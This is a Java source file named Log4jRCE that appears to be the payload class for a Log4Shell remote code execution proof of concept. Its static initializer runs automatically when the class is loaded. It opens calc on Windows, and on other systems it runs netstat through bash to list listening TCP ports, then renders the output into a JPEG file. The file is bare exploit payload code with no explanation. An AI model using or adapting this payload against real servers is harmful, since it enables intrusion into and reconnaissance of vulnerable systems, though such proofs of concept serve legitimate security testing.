import java.io.*;
import java.awt.Graphics;
import java.awt.image.BufferedImage;
import java.io.File;
import javax.imageio.ImageIO;

import java.awt.*;

public class Log4jRCE {
    public static String result = "";

    static {
        try {
            String osName = System.getProperty("os.name");
            if(osName.startsWith("Windows")) {
                String[] cmd = {"calc"};
                java.lang.Runtime.getRuntime().exec(cmd).waitFor();
            } else {
                String[] cmd = {"bash", "-c", "netstat -nalp |grep LISTEN |grep tcp"};
                Runtime r = Runtime.getRuntime();
                Process p = r.exec(cmd);
                BufferedReader in =
                        new BufferedReader(new InputStreamReader(p.getInputStream()));
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    result += inputLine + "\n";
                }
                in.close();

                BufferedImage bi = new BufferedImage(750, 400, BufferedImage.TYPE_INT_RGB);

                Graphics g = bi.getGraphics();
                g.setFont(new Font("TimesRoman", Font.PLAIN, 20));
                //g.drawString(new String(result.getBytes(), "utf-8"), 50, 50);
                drawString(g, result, 50, 50);

                ImageIO.write(bi, "jpeg", new File("test.jpg"));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void drawString(Graphics g, String text, int x, int y) {
        for (String line : text.split("\n"))
            g.drawString(line, x, y += g.getFontMetrics().getHeight());
    }

    public static void main(String[] args) {
    }
}
